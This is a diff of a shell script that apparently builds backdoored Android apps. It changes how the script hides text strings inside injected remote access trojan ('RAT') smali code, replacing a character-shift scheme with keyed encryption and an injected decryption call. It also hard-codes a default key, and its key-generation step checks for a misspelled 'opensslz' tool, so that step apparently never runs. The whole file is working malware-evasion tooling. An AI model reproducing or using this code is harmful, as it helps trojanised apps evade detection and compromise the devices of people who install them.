@@ -26,6 +26,7 @@ KEYTOOL=keytool
 JARSIGNER=jarsigner
 APKTOOL=apktool
 PROGUARD=third-party/proguard5.3.2/lib/proguard
+ASO=third-party/android-string-obfuscator/lib/aso
 DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
 ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 # file paths and misc
@@ -222,6 +223,7 @@ function init {
   consult_which $JARSIGNER
   consult_which $APKTOOL
   consult_which $PROGUARD
+  consult_which $ASO
   consult_which $DX
   consult_which $ZIPALIGN
   verify_orig_apk
@@ -418,16 +420,41 @@ fi
 echo -n "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/obfuscate.method <<EOL
 
-    invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
+    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object ###REG###
 EOL
 stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
 echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
+so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
+echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
+so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
+so_key=$so_default_key
+which opensslz >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc == 0 ]; then
+  so_key="$(opensslz rand -base64 16)"
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  file="$MY_PATH/original/smali/$stringobfuscator_class.smali"
+  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
+  rc=$?
+  if [ $rc == 0 ]; then
+    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
+  else
+    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
+    so_key=$so_default_key
+  fi
+else
+  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
+  so_key=$so_default_key 
+fi
+echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
 sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
+  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
     file=`echo $line |awk -F ": " '{ print $1 }'`
     echo "File: $file" >>$LOG_FILE 2>&1
     target=`echo $line |awk -F ", " '{ print $2 }'`
@@ -435,36 +462,39 @@ if [ $rc == 0 ]; then
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
-    trlist_max_line=`wc -l $MY_PATH/lists/trlist.txt |awk '{ print $1 }'`
-    trlist_rand_line=`shuf -i 1-${trlist_max_line} -n 1`
-    trlist_line=`sed "${trlist_rand_line}q;d" $MY_PATH/lists/trlist.txt`
-    shift_count=$(awk '{ print $1 }' <<< $trlist_line)
-    shift_tr_value=$(awk '{ print $2 }' <<< $trlist_line)
-    echo "Shift count: $shift_count" >>$LOG_FILE 2>&1
-    echo "Shift tr value: $shift_tr_value" >>$LOG_FILE 2>&1
-    replacement=`echo $target |tr '[A-Za-z]' $shift_tr_value |sed 's:^":"'"$shift_count"':g'`
+    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
+    replacement=`$ASO e "$stripped_target" k "$so_key"`
+    rc=$?
+    if [ $rc != 0 ]; then
+      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
+      touch $MY_PATH/obfuscate.error
+      break
+    fi
+    replacement="\"$(echo $replacement)\""
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to replace target value" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject register value" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
   done
   if [ ! -f $MY_PATH/obfuscate.error ]; then
-    #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
     class="$stringobfuscator_class"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
